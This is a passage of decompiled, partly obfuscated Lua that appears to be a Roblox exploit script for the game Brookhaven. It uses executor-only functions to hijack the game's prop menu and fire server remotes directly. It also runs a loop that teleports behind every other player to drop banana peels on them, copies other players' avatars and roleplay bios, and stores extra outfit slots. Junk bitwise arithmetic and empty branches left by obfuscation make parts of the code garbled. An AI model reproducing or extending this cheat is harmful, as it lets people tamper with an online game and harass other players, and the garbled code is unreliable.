	fn(260206744, localPlayer.CharacterAdded, 110056316, fn19)

	task.spawn(function()
		while not flag do
			task.wait(0.5)

			if flag2 then
				if animationStop and animationStop.Parent then
					animationStop.Visible = true
				end

				local v24 = fn3()

				if v24 then
					for _, v25 in ipairs(tbl2) do
						local track = v25.track

						if track and not track.IsPlaying then
							local n14 = 157973339

							if not pcall(function()
								track.Priority = Enum.AnimationPriority.Action4
								track.Looped = true
								track:Play(0.05, 1, 1)
							end) and v25.animationId ~= "" then
								local animation = Instance.new("Animation")
								animation.AnimationId = v25.animationId
								local n15 = 1033492918

								local ok2, track2 = pcall(function()
									return v24:LoadAnimation(animation)
								end)

								animation:Destroy()

								if ok2 and track2 then
									v25.track = track2
									track2.Priority = Enum.AnimationPriority.Action4
									track2.Looped = true
									track2:Play(0.05, 1, 1)
								end
							end
						end
					end
				end
			end
		end
	end)

	fn15()

	genv.__BrookhavenCrownEmotesCleanup = function()
		flag = true
		fn5(true)
		fn13()

		for _, v24 in ipairs(tbl) do
			local n14 = 618265937

			pcall(function()
				v24:Disconnect()
			end)
		end

		if clone and clone.Parent then
			clone:Destroy()
		end

		if clone2 and clone2.Parent then
			clone2:Destroy()
		end
	end
end

-- payload closure created 309-th (proto #205)
local function payload_fn_309()
	local n2 = 2379857260
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
	local v = n2
	local n3 = 426582926
	local container = playerGui:WaitForChild("NoResetGUIHandler"):WaitForChild("PropMenuFilter"):WaitForChild("Catalog"):WaitForChild("Container")
	local scrollingFrame = container:WaitForChild("ScrollingFrame")
	local telemetryClientInteraction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TelemetryClientInteraction")
	local n1Clea1rTool1s = ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s")
	local genv = getgenv() or _G
	local brookhavenDirectPropSelector = genv.BrookhavenDirectPropSelector

	if brookhavenDirectPropSelector then
		local v2 = ipairs
		local connections = brookhavenDirectPropSelector.connections or {}

		for _, connection in v2(connections) do
			local n4 = 104555386

			pcall(function()
				connection:Disconnect()
			end)
		end

		local v3 = ipairs
		local originalConnections = brookhavenDirectPropSelector.originalConnections or {}

		for _, originalConnection in v3(originalConnections) do
			pcall(function()
				originalConnection:Enable()
			end)
		end
	end

	local n4 = n3 + 410893357

	local brookhavenDirectPropSelector2 = {
		connections = {},
		originalConnections = {},
		bound = setmetatable({}, { __mode = "k" }),
		lastClick = 0,
		suppressPopupsUntil = 0,
	}

	local n5 = n2 // v
	genv.BrookhavenDirectPropSelector = brookhavenDirectPropSelector2
	local mainGUIHandler = playerGui:FindFirstChild("MainGUIHandler")
	local tbl = {}
	local disclaimer = container:FindFirstChild("Disclaimer")
	local itemCard = mainGUIHandler and mainGUIHandler:FindFirstChild("ItemCard")
	local shopAndFeatured = mainGUIHandler and mainGUIHandler:FindFirstChild("ShopAndFeatured")
	tbl[1] = disclaimer
	tbl[2] = itemCard
	tbl[3] = shopAndFeatured

	local function fn()
		brookhavenDirectPropSelector2.suppressPopupsUntil = os.clock() + 2

		for _, v2 in pairs(tbl) do
			if v2 and v2:IsA("GuiObject") then
				v2.Visible = false
			end
		end
	end

	local v2 = pairs

	for _, v3 in v2(tbl) do
		if v3 and v3:IsA("GuiObject") then
			table.insert(brookhavenDirectPropSelector2.connections, v3:GetPropertyChangedSignal("Visible"):Connect(function()
				local visible = v3.Visible

				if visible then
					local suppressPopupsUntil = brookhavenDirectPropSelector2.suppressPopupsUntil
					visible = os.clock() < suppressPopupsUntil
				end

				if visible then
					v3.Visible = false
				end
			end))
		end
	end

	local function fn2(arg)
		local function_ = arg.Function
		if type(function_) ~= "function" or not debug or not debug.getupvalues then
			return nil
		end
		local ok2, result2 = pcall(debug.getupvalues, function_)
		if not ok2 or type(result2) ~= "table" then
			return nil
		end

		for _, v3 in pairs(result2) do
			if type(v3) == "table" and type(v3.Name) == "string" and type(v3.Category) == "string" then
				return v3
			end
		end

		return nil
	end

	local function fn3(arg)
		local ok2, result2 = pcall(getconnections, arg.MouseButton1Click)
		local flag = not ok2
		if flag or type(result2) ~= "table" then
			return nil, nil
		end

		for _, v3 in ipairs(result2) do
			local v4 = fn2(v3)
			if v4 then
				return v3, v4
			end
		end

		return nil, nil
	end

	local function fn4(arg)
		for _, child in ipairs(scrollingFrame:GetChildren()) do
			if child:IsA("GuiButton") then
				local greenCheckMark = child:FindFirstChild("GreenCheckMark")

				if greenCheckMark and greenCheckMark:IsA("GuiObject") then
					greenCheckMark.Visible = child == arg
				end
			end
		end
	end

	local function fn5(arg, arg2)
		local now = os.clock()
		if now - brookhavenDirectPropSelector2.lastClick < 0.12 then
			return
		end
		brookhavenDirectPropSelector2.lastClick = now
		fn()
		telemetryClientInteraction:FireServer("filterClick", { name = arg2.Name, itemType = "Props" })
		n1Clea1rTool1s:FireServer("RequestingPropName", arg2.Name, arg2.Category)
		fn4(arg)
	end

	local function fn6(arg)
		local n6 = 475764000
		if brookhavenDirectPropSelector2.bound[arg] or not arg:IsA("GuiButton") or not arg:FindFirstChild("GreenCheckMark") then
			return true
		end
		local v3, v4 = fn3(arg)
		local flag = not v3
		local n7 = n6 + 521796788
		if flag or not v4 then
			return false
		end
		local n8 = n7 - 464513985
		if v4.IsCategory == true then
			brookhavenDirectPropSelector2.bound[arg] = true
			return true
		end

		pcall(function()
			v3:Disable()
		end)

		table.insert(brookhavenDirectPropSelector2.originalConnections, v3)

		table.insert(brookhavenDirectPropSelector2.connections, arg.MouseButton1Click:Connect(function()
			fn5(arg, v4)
		end))

		brookhavenDirectPropSelector2.bound[arg] = true
		return true
	end

	local function fn7()
		for _, child in ipairs(scrollingFrame:GetChildren()) do
			fn6(child)
		end
	end

	fn7(128952308, 400140623)

	table.insert(brookhavenDirectPropSelector2.connections, scrollingFrame.ChildAdded:Connect(function(child)
		task.defer(fn6, child)
	end))
end

-- payload closure created 320-th (proto #223)
local function payload_fn_320(arg)
	return arg and arg.Character
end

-- payload closure created 321-th (proto #222)
local function payload_fn_321(arg)
	local v = upv1(arg)
	return v and v:FindFirstChild("HumanoidRootPart")
end

-- payload closure created 322-th (proto #226)
local function payload_fn_322(arg)
	local v = upv1(arg)
	return v and v:FindFirstChildOfClass("Humanoid")
end

-- payload closure created 323-th (proto #225)
local function payload_fn_323(arg)
	local v = upv1(arg)
	return v and v.Sit
end

-- payload closure created 324-th (proto #t4901)
local function payload_fn_324()
	return upv1:FindFirstChildOfClass("Backpack")
end

-- payload closure created 325-th (proto #t883)
local function payload_fn_325()
	local v = upv1(upv2)

	if v and v.Sit then
		v.Sit = false
		v.Jump = true
		task.wait(0.2)
	end
end

-- payload closure created 326-th (proto #221)
local function payload_fn_326()
	local v = upv1(upv2)

	if v and not upv3 then
		upv3 = v.CFrame
	end

	if upv4 and not upv5 then
		upv5 = upv4.CameraSubject
	end
end

-- payload closure created 327-th (proto #670)
local function payload_fn_327()
	upv1 = nil
	local v = upv2(upv3)

	if upv4 then
		upv4.CameraSubject = v or upv5
	end
end

-- payload closure created 328-th (proto #227)
local function payload_fn_328()
	local v = upv1(upv2)

	if v and upv3 then
		v.CFrame = upv3
		v.Anchored = true
		task.wait(0.35)
		v.Anchored = false
	end

	upv3 = nil
	upv4()
end

-- payload closure created 329-th (proto #t2239)
local function payload_fn_329(arg)
	upv1 = arg
	local v = upv2(arg)
	local v2 = upv3
	local v3

	if upv3 then
		v3 = v
	else
		v3 = v2
	end

	if v3 then
		upv3.CameraSubject = v
	end
end

-- payload closure created 330-th (proto #210)
local function payload_fn_330()
	while true do
		task.wait(0.15)

		if upv1 then
			local v = upv2(upv1)

			if upv3 and v then
				upv3.CameraSubject = v
			end
		end
	end
end

-- payload closure created 331-th (proto #t7352)
local function payload_fn_331()
	upv2 = upv1:FindFirstChild("1Playe1rTrigge1rEven1t")
	local n2 = 8998482584
	if not upv2 then
		warn("Remote da banana não encontrado.")
		return false
	end
	local tbl = {}
	local v = bit32.bxor(n2, 218931390)
	tbl[1] = "AcceptedToolToServer"
	tbl[2] = "Minions2026_BananaPeel"
	tbl[3] = upv3

	return (pcall(function()
		upv2:FireServer(unpack(tbl))
	end))
end

-- payload closure created 332-th (proto #t7361)
local function payload_fn_332()
	local v = upv1(upv2)
	local v2 = upv3()

	if v then
		for _, child in ipairs(v:GetChildren()) do
			if child:IsA("Tool") and child.Name:lower():find("banana") then
				return child
			end
		end
	end

	if v2 then
		for _, child in ipairs(v2:GetChildren()) do
			if child:IsA("Tool") and child.Name:lower():find("banana") then
				return child
			end
		end
	end

	return nil
end

-- payload closure created 333-th (proto #t5216)
local function payload_fn_333()
	local v = upv1(upv2)
	local v2 = upv3(upv2)
	if not v or not v2 then
		return nil
	end
	local v3 = upv4
	local v4 = upv4()

	if not v4 then
		upv5()
		task.wait(0.4)
		v4 = upv4()
	end

	if v4 and v4.Parent ~= v then
		local n2 = 518519262

		if type(v3) == "userdata" then
		end

		local v5 = pcall
		local v6 = table.pack(bit32.band(n2, 4294967295))
		local v7 = table.pack(bit32.band(v6[1], 65535))
		local n3 = bit32.band(28799 * v7[1] + bit32.lshift(bit32.band(28799 * bit32.rshift(v6[1], 16) + 11733 * v7[1], 65535), 16), 4294967295) + 1447365697
		local v8 = table.pack(bit32.band(bit32.bor(n2, 19079999), 4294967295))
		local v9 = table.pack(bit32.band(v8[1], 65535))
		local v10 = bit32.band(36738 * v9[1] + bit32.lshift(bit32.band(36738 * bit32.rshift(v8[1], 16) + 53802 * v9[1], 65535), 16), 4294967295)
		local v11 = table.pack(bit32.band(bit32.band(n2, 19079999), 4294967295))
		local v12 = table.pack(bit32.band(v11[1], 65535))
		local n4 = n3 + v10 + bit32.band(36736 * v12[1] + bit32.lshift(bit32.band(36736 * bit32.rshift(v11[1], 16) + 53802 * v12[1], 65535), 16), 4294967295)

		v5(function()
			v2:EquipTool(v4)
		end)

		task.wait(0.25)
	end

	v4 = upv4()
	if v4 and v4.Parent == v then
		return v4
	end
	return nil
end

-- payload closure created 334-th (proto #t3292)
local function payload_fn_334(arg)
	if vector.create then
		return vector.create(arg.X, arg.Y, arg.Z)
	end
	return Vector3.new(arg.X, arg.Y, arg.Z)
end

-- payload closure created 335-th (proto #t1117)
local function payload_fn_335(arg)
	local v = arg or upv1
	local v2 = upv2(v)
	local v3 = upv3(v)
	if not v3 then
		return nil
	end
	local raycastParams = RaycastParams.new()
	raycastParams.FilterType = Enum.RaycastFilterType.Exclude
	raycastParams.FilterDescendantsInstances = v2 and { v2 } or {}
	local hit = upv4:Raycast(v3.Position + Vector3.new(0, 3, 0), Vector3.new(0, -25, 0), raycastParams)
	return upv5((hit and hit.Position or v3.Position - Vector3.new(0, 3, 0)) + Vector3.new(0, 0.025, 0))
end

-- payload closure created 336-th (proto #t4451)
local function payload_fn_336(arg)
	if not arg then
		return nil
	end
	return arg:FindFirstChild("PlaceBananaPeel") or arg:WaitForChild("PlaceBananaPeel", 1.5)
end

-- payload closure created 337-th (proto #t5351)
local function payload_fn_337(arg)
	local v = upv1()
	local n2 = 432939134
	if not v then
		warn("Não conseguiu equipar a banana.")
		return false
	end
	local v2 = v
	local v3 = upv2(v2)
	local v4 = arg or upv3(upv4)

	if v3 and v4 then
		local n3 = 47652583


		local n4 = n3 + 406131717

		if pcall(function()
			v3:FireServer(v4)
		end) then
			task.wait(0.25)
			return true
		end
	end

	pcall(function()
		v:Activate()
	end)

	task.wait(0.25)
	return true
end

-- payload closure created 338-th (proto #t4712)
local function payload_fn_338(arg)
	local v = upv1(upv2)
	local v2 = upv1(arg)
	if not v or not v2 then
		return false
	end

	if upv3(arg) then
		return false
	end
	upv4()
	v.CFrame = CFrame.new(v2.Position - v2.CFrame.LookVector * upv5, v2.Position)
	return true
end

-- payload closure created 339-th (proto #t3166)
local function payload_fn_339(arg)
	if not arg or arg == upv1 then
		return false
	end

	if not upv2(arg) then
		return false
	end

	if upv3(arg) then
		return false
	end
	upv4(arg)
	if not upv5(arg) then
		return false
	end
	task.wait(0.2)
	if not upv6(upv7(arg)) then
		return false
	end
	return true
end

-- payload closure created 340-th (proto #t2869)
local function payload_fn_340(arg)
	if not arg or arg == upv1 then
		return false
	end

	if not upv2(arg) then
		return false
	end

	if upv3(arg) then
		return false
	end

	if not upv4(upv5(arg)) then
		return false
	end
	return true
end

-- payload closure created 341-th (proto #224)
local function payload_fn_341()
	local tbl = {}
	local str = upv1

	if type(str) ~= "string" or str == "" then
		upv1 = "Todos"
		str = "Todos"
	end

	if str == "Todos" then
		for _, player in ipairs(upv2:GetPlayers()) do
			if player ~= upv3 and upv4(player) and not upv5(player) then
				table.insert(tbl, player)
			end
		end
	else
		local v = upv2:FindFirstChild(str)

		if v and v ~= upv3 and upv4(v) and not upv5(v) then
			table.insert(tbl, v)
		end
	end

	return tbl
end

-- payload closure created 342-th (proto #236)
local function payload_fn_342()
	local tbl = {}
	local v = upv1(upv2)
	if not v then
		return tbl
	end

	for _, player in ipairs(upv3:GetPlayers()) do
		local v2 = upv1(player)

		if player ~= upv2 and v2 and not upv4(player) then
			if (v2.Position - v.Position).Magnitude <= upv5 then
				table.insert(tbl, player)
			end
		end
	end

	return tbl
end

-- payload closure created 343-th (proto #220)
local function payload_fn_343()
	if upv1 or upv2 then
		return
	end
	upv1 = true
	upv2 = true
	upv3()

	for _, v in ipairs(upv4()) do
		if upv1 then
			upv5(v)
			task.wait(0.7)
			continue
		end

		break
	end

	upv1 = false
	upv2 = false
	upv6()
end

-- payload closure created 344-th (proto #230)
local function payload_fn_344(arg, arg2, arg3, arg4)
	upv1()
	local n2 = 4372951031
	arg4 = arg4 or upv2

	local ok2 = pcall(function()

		while arg2() do
			local flag = true
			upv3 = true
			local ok2, result2 = pcall(arg)

			if not ok2 or type(result2) ~= "table" then
				result2 = {}
			end

			for _, v in ipairs(result2) do
				local n3 = 74831400

				if arg2() then
					local v2 = pcall
					local v3 = table.pack(bit32.band(n3, 4294967295))
					local v4 = table.pack(bit32.band(v3[1], 65535))
					local n4 = bit32.band(53322 * v4[1] + bit32.lshift(bit32.band(53322 * bit32.rshift(v3[1], 16) + 22936 * v4[1], 65535), 16), 4294967295) + 3894073132
					local v5 = table.pack(bit32.band(bit32.bor(n3, 471602782), 4294967295))
					local v6 = table.pack(bit32.band(v5[1], 65535))
					local v7 = bit32.band(12215 * v6[1] + bit32.lshift(bit32.band(12215 * bit32.rshift(v5[1], 16) + 42599 * v6[1], 65535), 16), 4294967295)
					local v8 = table.pack(bit32.band(bit32.band(n3, 471602782), 4294967295))
					local v9 = table.pack(bit32.band(v8[1], 65535))
					local n5 = n4 + v7 + bit32.band(12213 * v9[1] + bit32.lshift(bit32.band(12213 * bit32.rshift(v8[1], 16) + 42599 * v9[1], 65535), 16), 4294967295)

					local v10, v11 = v2(function()
						return arg4(v)
					end)

					if v10 and v11 then
						upv4 = math.max(0.7, upv4 - upv5)
					else
						upv4 = math.min(1.8, upv4 + upv6)
					end

					upv7()
					task.wait(upv4)
					continue
				end

				break
			end

			upv3 = false

			if #result2 == 0 then
				upv4 = math.min(1.8, upv4 + upv6)
				task.wait(0.35)
			else
				task.wait(0.2)
			end
		end
	end)

	upv3 = false

	if arg3 then
		arg3()
	end

	upv8()

	if not ok2 then
		warn("Banana loop parou por erro, camera resetada.")
	end
end

-- payload closure created 345-th (proto #211)
local function payload_fn_345()
	local tbl = { "Todos" }

	for _, player in ipairs(upv1:GetPlayers()) do
		if player ~= upv2 then
			table.insert(tbl, player.Name)
		end
	end

	return tbl
end

-- payload closure created 346-th (proto #214)
local function payload_fn_346(arg)
	local v = upv1()
	local flag = type(upv2) ~= "string"
	local n2 = 326358447

	if flag or upv2 == "" or upv2 ~= "Todos" and not upv3:FindFirstChild(upv2) then
		upv2 = "Todos"
	end

	pcall(function()
		arg:Set(v)
	end)

	pcall(function()
		arg:Refresh(v)
	end)

	pcall(function()
		arg:SetValues(v)
	end)
end

-- payload closure created 347-th (proto #212)
local function payload_fn_347(arg)
	if type(arg) == "string" and arg ~= "" then
		upv1 = arg
	else
		upv1 = "Todos"
	end
end

-- payload closure created 348-th (proto #213)
local function payload_fn_348()
	upv1(upv2)
end

-- payload closure created 352-th (proto #218)
local function payload_fn_352()
	local flag = type(0) == "buffer"
	local n2 = 38667827

	task.spawn(function()
		upv1()
	end)
end

-- payload closure created 354-th (proto #228)
local function payload_fn_354(arg)
	upv1 = arg

	if upv1 and not upv2 then
		local flag = type(0) == "buffer"
		upv2 = true
		local n2 = 244161618

		task.spawn(function()
			local flag2 = bit32.bxor(n2, 0) + 352300851 == 491857476
			local n3 = 26968810

			upv3(upv4, function()
				return upv1
			end, function()
				upv2 = false
			end)
		end)
	end
end

-- payload closure created 359-th (proto #233)
local function payload_fn_359(arg)
	upv1 = arg
	local flag = upv1 and not upv2

	if flag then
		local n2 = 422304951


		upv2 = true
		local n3 = n2 + 9496343 + 9813517

		task.spawn(function()
			local flag2 = bit32.bxor(bit32.bxor(n3, 0), 165097411) ~= 327527960
			local n4 = 410761925

			upv3(upv4, function()
				return upv1
			end, function()
				upv2 = false
			end, upv5)
		end)
	end
end

-- payload closure created 363-th (proto #t5207)
local function payload_fn_363(arg)
	local n2 = 4081415274
	local n3 = 357831794
	local n4 = 3068585085
	local humanoid = arg:WaitForChild("Humanoid", 2)
	if not humanoid then
		return nil
	end
	local appliedDescription = humanoid:GetAppliedDescription()

	local tbl = {
		shirt = tonumber(appliedDescription.Shirt) or 0,
		pants = tonumber(appliedDescription.Pants) or 0,
		tshirt = tonumber(appliedDescription.GraphicTShirt) or 0,
		face = tonumber(appliedDescription.Face) or 0,
	}

	local v = bit32.bor(n3, n4)
	tbl.idle = tonumber(appliedDescription.IdleAnimation) or 0
	tbl.walk = tonumber(appliedDescription.WalkAnimation) or 0
	local v2 = tonumber
	local runAnimation = appliedDescription.RunAnimation
	local v3 = table.pack(bit32.band(n4, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local v5 = bit32.band(v4[1] * 25341 + bit32.lshift(bit32.band(v4[1] * 0 + bit32.rshift(v3[1], 16) * 25341, 65535), 16), 4294967295)
	tbl.run = v2(runAnimation) or 0
	tbl.jump = tonumber(appliedDescription.JumpAnimation) or 0
	tbl.fall = tonumber(appliedDescription.FallAnimation) or 0
	tbl.climb = tonumber(appliedDescription.ClimbAnimation) or 0
	tbl.swim = tonumber(appliedDescription.SwimAnimation) or 0
	local tbl2 = {}

	for _, v6 in ipairs(appliedDescription:GetAccessories(true)) do
		local num = tonumber(v6.AssetId)

		if num and num > 0 then
			table.insert(tbl2, num)
		end
	end

	local str = "Bright yellow"

	if arg:FindFirstChild("Body Colors") then
		str = tostring(arg["Body Colors"].HeadColor)
	end

	local tbl3 = { data = tbl, accs = tbl2, skin = str }
	local body = {}
	local n5 = tonumber(appliedDescription.Torso) or 0
	local n6 = tonumber(appliedDescription.RightArm) or 0
	local n7 = tonumber(appliedDescription.LeftArm) or 0
	local n8 = tonumber(appliedDescription.RightLeg) or 0
	local v6 = tonumber
	local n9 = v6(appliedDescription.LeftLeg) or 0
	local n10 = tonumber(appliedDescription.Head) or 0
	body[1] = n5
	body[2] = n6
	body[3] = n7
	body[4] = n8
	body[5] = n9
	body[6] = n10
	tbl3.body = body
	return tbl3
end

-- payload closure created 364-th (proto #237)
local function payload_fn_364()
	local tbl = {}

	for _, player in ipairs(upv1:GetPlayers()) do
		if player.Name ~= upv2.Name then
			table.insert(tbl, player.Name)
		end
	end

	return tbl
end

-- payload closure created 365-th (proto #238)
local function payload_fn_365(arg)
	upv1 = arg
end

-- payload closure created 366-th (proto #240)
local function payload_fn_366()
	upv1:Set(upv2())
end

-- payload closure created 367-th (proto #239)
local function payload_fn_367()
	upv1()
end

-- payload closure created 368-th (proto #241)
local function payload_fn_368()
	local n2 = 11077520
	local n3 = 1190121394
	if not upv1 then
		return
	end
	local v = upv2:FindFirstChild(upv1)

	if v and v.Character then
		local v2 = upv3
		local n4 = 329544129
		local v3 = bit32.band(n3, n2)
		local v4 = v2(v.Character)
		if not v4 then
			return
		end

		local function fn(arg, arg2, arg3, arg4)
			bit32.bxor(bit32.bxor(n4, 0), 46856727)
			local flag = not arg3
			local n5 = 455986443
			if flag or arg3 <= 0 then
				return
			end
			local v5 = pcall
			local v6 = table.pack(bit32.band(arg4, 4294967295))
			local v7 = table.pack(bit32.band(v6[1], 65535))
			local v8 = bit32.band(7373 * v7[1] + bit32.lshift(bit32.band(7373 * bit32.rshift(v6[1], 16) + 49406 * v7[1], 65535), 16), 4294967295)
			local v9 = table.pack(bit32.band(bit32.bnot(arg4), 4294967295))
			local v10 = table.pack(bit32.band(v9[1], 65535))
			local n6 = 3291551915 + n5 + v8 + bit32.band(7373 * v10[1] + bit32.lshift(bit32.band(7373 * bit32.rshift(v9[1], 16) + 49406 * v10[1], 65535), 16), 4294967295)

			v5(function()
				arg2:InvokeServer(arg3)
			end)

			task.wait(0.6)
		end

		pcall(function()
			game.StarterGui:SetCore("SendNotification", { Title = "Status", Text = "Copiando skin de " .. v.Name, Duration = 3 })
		end)

		local tbl = { "Load", "BH-AE-0799b79004e84abebbc6d803240dac4e" }

		pcall(function()
			upv4:WaitForChild("AvatarEditorOutfitCodes"):InvokeServer(unpack(tbl))
		end)

		task.wait(2.5)

		pcall(function()
			upv4.ChangeCharacterBody:InvokeServer(v4.body)
		end)

		local n5 = n2 - 3835059461
		task.wait(1.5)

		pcall(function()
			upv4.ChangeBodyColor:FireServer(v4.skin)
		end)

		task.wait(0.8)
		fn(39692584, upv5, v4.data.shirt, 516527881)
		fn(165290548, upv6, v4.data.pants, 516527881)
		fn(286325349, upv7, v4.data.tshirt, 516527881)
		fn(196586087, upv7, v4.data.face, 516527881)

		for _, acc in ipairs(v4.accs) do
			fn(211653526, upv7, acc, 516527881)
		end

		local n6 = v3 + 3812082268

		for _, v5 in ipairs({
			v4.data.idle,
			v4.data.walk,
			v4.data.run,
			v4.data.jump,
			v4.data.fall,
			v4.data.climb,
			v4.data.swim,
		}) do
			fn(105706502, upv7, v5, 516527881)
		end

		local playersBag = v:FindFirstChild("PlayersBag")
		local v5 = table.pack(bit32.band(n5, 4294967295))
		local v6 = table.pack(bit32.band(n6, 4294967295))
		local v7 = table.pack(bit32.band(v5[1], 65535))
		local v8 = table.pack(bit32.rshift(v5[1], 16))
		local v9 = table.pack(bit32.band(v6[1], 65535))
		local v10 = bit32.band(v7[1] * v9[1] + bit32.lshift(bit32.band(v7[1] * bit32.rshift(v6[1], 16) + v8[1] * v9[1], 65535), 16), 4294967295)

		if playersBag then
			local n7 = 296514625

			task.spawn(function()
				if playersBag:FindFirstChild("RPName") and playersBag.RPName.Value ~= "" then
					pcall(function()
						upv8:FireServer("RolePlayName", playersBag.RPName.Value)
					end)
				end

				if playersBag:FindFirstChild("RPBio") and playersBag.RPBio.Value ~= "" then
					local n8 = 8882777192

					pcall(function()
						upv8:FireServer("RolePlayBio", playersBag.RPBio.Value)
					end)
				end

				if playersBag:FindFirstChild("RPNameColor") then
					pcall(function()
						upv9:FireServer("PickingRPNameColor", playersBag.RPNameColor.Value)
					end)
				end

				if playersBag:FindFirstChild("RPBioColor") then
					local n8 = 599063591

					pcall(function()
						upv9:FireServer("PickingRPBioColor", playersBag.RPBioColor.Value)
					end)
				end
			end)
		end

		pcall(function()
			game.StarterGui:SetCore("SendNotification", { Title = "Sucesso", Text = "Avatar copiado com sucesso!", Duration = 5 })
		end)

	end
end

-- payload closure created 369-th (proto #245)
local function payload_fn_369(arg, arg2)
	local n2 = 473878346

	pcall(function()
		game:GetService("StarterGui"):SetCore("SendNotification", { Title = arg, Text = arg2, Duration = 5 })
	end)
end

-- payload closure created 370-th (proto #242)
local function payload_fn_370(arg)
	local n2 = 263874268

	if bit32.bxor(arg, 461191295) == 77332096 then
	end

	local v = type
	local v2 = isfile
	local v3 = table.pack(bit32.band(n2, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local n3 = bit32.band(48941 * v4[1] + bit32.lshift(bit32.band(48941 * bit32.rshift(v3[1], 16) + 38226 * v4[1], 65535), 16), 4294967295) + 745003288
	local v5 = table.pack(bit32.band(bit32.bor(n2, 89959544), 4294967295))
	local v6 = table.pack(bit32.band(v5[1], 65535))
	local v7 = bit32.band(33190 * v6[1] + bit32.lshift(bit32.band(33190 * bit32.rshift(v5[1], 16) + 54618 * v6[1], 65535), 16), 4294967295)
	local v8 = table.pack(bit32.band(bit32.bxor(n2, 89959544), 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local n4 = n3 + v7 + bit32.band(48942 * v9[1] + bit32.lshift(bit32.band(48942 * bit32.rshift(v8[1], 16) + 38226 * v9[1], 65535), 16), 4294967295)
	local v10 = v(v2)
	local v11 = bit32.bxor(n4, 181117117)
	if v10 ~= "function" or type(readfile) ~= "function" or not isfile(upv1) then
		return
	end

	local ok2, result2 = pcall(function()
		return upv2:JSONDecode(readfile(upv1))
	end)

	if not ok2 or type(result2) ~= "table" then
		return
	end

	for _, v12 in ipairs(result2) do
		local num = tonumber(v12.slot)

		if num and num >= 26 and type(v12.name) == "string" then
			upv3[num] = v12.name
		end
	end
end

-- payload closure created 371-th (proto #t1468)
local function payload_fn_371()
	local n2 = 311768685
	if type(writefile) ~= "function" then
		return
	end
	local tbl = {}
	local n3 = n2 + 195171395

	for k, v in pairs(upv1) do
		table.insert(tbl, { slot = k, name = v })
	end

	local n4 = n3 + 140301530

	table.sort(tbl, function(arg, arg2)
		return arg.slot < arg2.slot
	end)

	pcall(function()
		writefile(upv2, upv3:JSONEncode(tbl))
	end)
end

-- payload closure created 372-th (proto #247)
local function payload_fn_372()
	upv1 = {}
	local tbl = {}

	for k in pairs(upv2) do
		table.insert(tbl, k)
	end

	table.sort(tbl)
	local tbl2 = {}

	for _, v in ipairs(tbl) do
		local v2 = upv2[v]
		table.insert(tbl2, v2)
		upv1[v2] = v
	end

	if #tbl2 == 0 then
		table.insert(tbl2, "Nenhum outfit extra salvo")
	end

	return tbl2
end

-- payload closure created 373-th (proto #t4987)
local function payload_fn_373()
	upv1 = nil

	if upv2 then
		local n2 = 407012827


		local n3 = n2 + 137417097

		pcall(function()
			upv2:Set(upv3())
		end)
	end
end

-- payload closure created 374-th (proto #t9698)
local function payload_fn_374()
	local n2 = 26

	while upv1[n2] do
		n2 += 1
	end

	return n2
end

-- payload closure created 375-th (proto #t5324)
local function payload_fn_375(arg, ...)
	local flag = type(0) == "function"
	local tbl = { ... }
	local v

	return pcall(function()
		if arg:IsA("RemoteFunction") then
			local response = arg:InvokeServer(unpack(tbl))

			if response == false then
				error("O servidor recusou a operação")
			end

			return response
		end

		arg:FireServer(unpack(tbl))
		return true
	end)
end

-- payload closure created 376-th (proto #243)
local function payload_fn_376(arg)
	upv1 = tostring(arg or ""):match("^%s*(.-)%s*$")
end

-- payload closure created 377-th (proto #244)
local function payload_fn_377()
	if upv1 == "" then
		upv2("Outfits Extras", "Digite um nome para o outfit antes de salvar.")
		return
	end

	for _, v in pairs(upv3) do
		if v:lower() == upv1:lower() then
			upv2("Outfits Extras", "Já existe um outfit com esse nome. Escolha outro nome.")
			return
		end
	end

	local v = upv4()
	if not upv5(upv6, v, upv1) then
		upv2("Erro", "Não foi possível salvar o outfit.")
		return
	end
	upv3[v] = upv1
	upv7()
	upv8()
	upv2("Sucesso", "Outfit '" .. upv1 .. "' salvo com sucesso.")
end

-- payload closure created 379-th (proto #248)
local function payload_fn_379(arg)
	upv2 = upv1[tostring(arg or "")]
end

-- payload closure created 380-th (proto #249)
local function payload_fn_380()
	if not upv1 or not upv2[upv1] then
		upv3("Outfits Extras", "Selecione um outfit salvo no dropdown.")
		return
	end
	local v = upv4(upv5, upv1)
	upv3(v and "Sucesso" or "Erro", v and "Outfit equipado com sucesso." or "Não foi possível equipar o outfit selecionado.")
end

-- payload closure created 381-th (proto #250)
local function payload_fn_381()
	if not upv1 or not upv2[upv1] then
		upv3("Outfits Extras", "Selecione um outfit salvo no dropdown para substituir.")
		return
	end
	local v = upv1
	local flag = upv4 ~= "" and upv4 or upv2[v]

	if upv4 ~= "" then
		for k, v2 in pairs(upv2) do
			if k ~= v and v2:lower() == upv4:lower() then
				upv3("Outfits Extras", "Já existe outro outfit com esse nome. Escolha outro nome.")
				return
			end
		end
	end

	if not upv5(upv6, v, flag) then
		upv3("Erro", "Não foi possível substituir o outfit.")
		return
	end
	upv2[v] = flag
	upv7()
	upv8()
	upv3("Sucesso", "Outfit substituído por '" .. flag .. "' com sucesso.")
end

-- payload closure created 382-th (proto #251)
local function payload_fn_382()
	if not upv1 or not upv2[upv1] then
		upv3("Outfits Extras", "Selecione um outfit salvo no dropdown.")
		return
	end
	local v = upv1
	local v2 = upv2[v]
	local deleteOutfit = upv4:FindFirstChild("DeleteOutfit") or upv4:FindFirstChild("RemoveOutfit")

	if deleteOutfit then
		local flag = type(153336458) == "boolean"
		local n2 = 13209290441

		pcall(function()
			upv5(deleteOutfit, v)
		end)
	end

	upv2[v] = nil
	upv6()
	upv7()
	upv3("Sucesso", "Outfit '" .. tostring(v2) .. "' removido dos salvos com sucesso.")
end

-- payload closure created 383-th (proto #254)
local function payload_fn_383(arg)
	local v = upv1[arg]
	local character = upv2.Character
	character = character and character:FindFirstChildOfClass("Humanoid")
	if not character then
		return
	end
	local appliedDescription = character:GetAppliedDescription()
	local tbl = { { appliedDescription.Torso, appliedDescription.RightArm, appliedDescription.LeftArm, appliedDescription.RightLeg, appliedDescription.LeftLeg, appliedDescription.Head } }

	if v then
		tbl[1][arg] = tonumber(v) or v
	end

